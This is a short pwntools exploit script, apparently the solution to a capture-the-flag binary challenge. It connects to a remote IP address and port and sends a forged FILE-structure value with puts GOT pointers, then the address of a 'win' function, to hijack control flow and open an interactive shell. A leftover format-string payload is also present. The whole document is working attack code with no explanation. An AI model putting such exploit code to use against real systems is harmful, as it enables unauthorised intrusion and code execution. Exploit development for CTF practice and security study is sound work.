from pwn import *

elf = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf

# p = process(stdout=PIPE)
p = remote("34.124.170.181", 17164)
# gdb.attach(p, "break *main+175")

payload = "b%p"

assert len(payload) <= 32, f"Payload length: {len(payload)}"

p.sendlineafter(b'> ', pack(0xfbad2484) + pack(elf.got['puts']) * 5 + pack(elf.got['puts'] + 8) + pack(elf.got['puts']) * 2)
# p.sendlineafter(b'> ', b'a')       # First scanf (title)
p.sendlineafter(b'> ', pack(elf.symbols['win']))    # Second scanf (note)

p.interactive()